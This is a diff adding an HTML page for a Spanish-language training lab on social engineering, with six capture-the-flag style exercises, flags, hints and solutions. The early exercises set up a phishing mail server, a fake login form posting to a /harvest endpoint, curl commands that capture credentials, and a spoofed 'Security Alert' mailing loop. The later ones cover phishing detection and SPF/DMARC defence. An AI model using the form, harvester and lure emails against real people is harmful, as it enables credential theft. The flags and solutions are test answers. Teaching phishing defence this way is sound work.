@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🎭 Lab social-01: Ingeniería Social — CyberDefense Labs</title>
+    <link rel="stylesheet" href="../../assets/css/lab-runner.css">
+</head>
+<body>
+    <div class="lab-page" id="lab-page"></div>
+    <script src="../../docs/assets/js/gamification.js"></script>
+    <script src="../../assets/js/lab-runner.js"></script>
+    <script>
+    const LAB_CONFIG = {
+        id: 'social-01', name: 'Ingeniería Social', subtitle: 'Campañas de phishing y defensa',
+        icon: '🎭', difficulty: 'intermedio', totalXP: 300, time: '60 min',
+        exercises: [
+            { title: 'Mail Server Config', xp: 40, objective: 'Configura un mail server para phishing controlado.', steps: ['Verifica postfix status', 'Configura el dominio', 'Envía email de prueba'], code: '$ postconf -e "myhostname = phishing-sim.local"\n$ postfix reload\n$ echo "Test" | mail -s "Test" victim@phishing-sim.local', codeLang: 'bash', flag: 'FLAG{mail_server_config_ok}', hint: 'postfix es el mail server. postconf configura parámetros.', solution: 'Mail server configurado con dominio phishing-sim.local. Emails se envían correctamente.' },
+            { title: 'Landing Page', xp: 50, objective: 'Crea una página de login falsa convincente.', steps: ['Analiza la landing existente', 'Crea una variante', 'Verifica que el form funciona'], code: '<form action="/harvest" method="POST">\n  <input type="email" name="email" placeholder="Email">\n  <input type="password" name="password" placeholder="Password">\n  <button type="submit">Sign In</button>\n</form>', codeLang: 'html', flag: 'FLAG{landing_page_created}', hint: 'La landing debe parecer legítima: logo corporativo, CSS profesional, formulario funcional.', solution: 'Landing page creada con formulario que envía credenciales al harvest server.' },
+            { title: 'Credential Harvester', xp: 50, objective: 'Captura credenciales de víctimas simuladas.', steps: ['Envía POST al harvest endpoint', 'Simula víctimas', 'Verifica captura'], code: '$ curl -X POST http://10.0.8.30/harvest -d "email=alice@corp.local&password=test123"\n$ curl http://10.0.8.30/credentials', codeLang: 'bash', flag: 'FLAG{creds_captured}', hint: 'El harvest server guarda credenciales en /credentials. Cada POST agrega una entrada.', solution: 'Credenciales capturadas: alice@corp.local / test123. Harvester funcionando.' },
+            { title: 'Campaña Completa', xp: 60, objective: 'Ejecuta una campaña y analiza métricas.', steps: ['Envía emails a víctimas', 'Simula clicks', 'Analiza métricas de conversión'], code: '$ for v in alice@corp bob@corp; do\n    echo "Verify your account" | mail -s "Security Alert" -r "admin@phishing-sim.local" $v\n  done\n$ curl http://10.0.8.30/metrics', codeLang: 'bash', flag: 'FLAG{campaign_metrics_analyzed}', hint: 'Las métricas incluyen: emails enviados, clicks, credenciales capturadas, tasa de conversión.', solution: 'Campaña ejecutada. Métricas: 2 emails, 2 clicks, 2 credenciales. Tasa de conversión: 100%.' },
+            { title: 'Análisis de Phishing', xp: 50, objective: 'Identifica señales de phishing en un email.', steps: ['Revisa headers del email', 'Analiza el From y Return-Path', 'Verifica URLs y certificados'], code: '# Señales de phishing:\n# 1. From: security@phishing-sim.local (dominio falso)\n# 2. Link: http://10.0.8.20 (IP interna)\n# 3. Urgencia: "Verify immediately"\n# 4. Sin SPF/DKIM/DMARC', codeLang: 'text', flag: 'FLAG{phishing_signals_identified}', hint: 'Busca: dominio falso, URLs sospechosas, urgencia, sin autenticación de email.', solution: '4 señales identificadas: dominio falso, IP interna, urgencia excesiva, sin SPF/DKIM.' },
+            { title: 'Defensa Documentada', xp: 50, objective: 'Crea un reporte de defensa contra phishing.', steps: ['Documenta señales de phishing', 'Configura SPF/DMARC', 'Crea guía de capacitación'], code: '# defense_report.md\n## SPF: v=spf1 ip4:legit-server -all\n## DMARC: v=DMARC1; p=reject\n## Capacitación: no hacer clic en links sospechosos', codeLang: 'markdown', flag: 'FLAG{defense_report_complete}', hint: 'El reporte debe incluir: señales, verificación, configuración técnica, capacitación.', solution: 'Reporte de defensa completo con SPF, DMARC y guía de capacitación.' }
+        ]
+    };
+    document.addEventListener('DOMContentLoaded', () => { CDPN_LabRunner.init(LAB_CONFIG); });
+    </script>
+</body>
+</html>
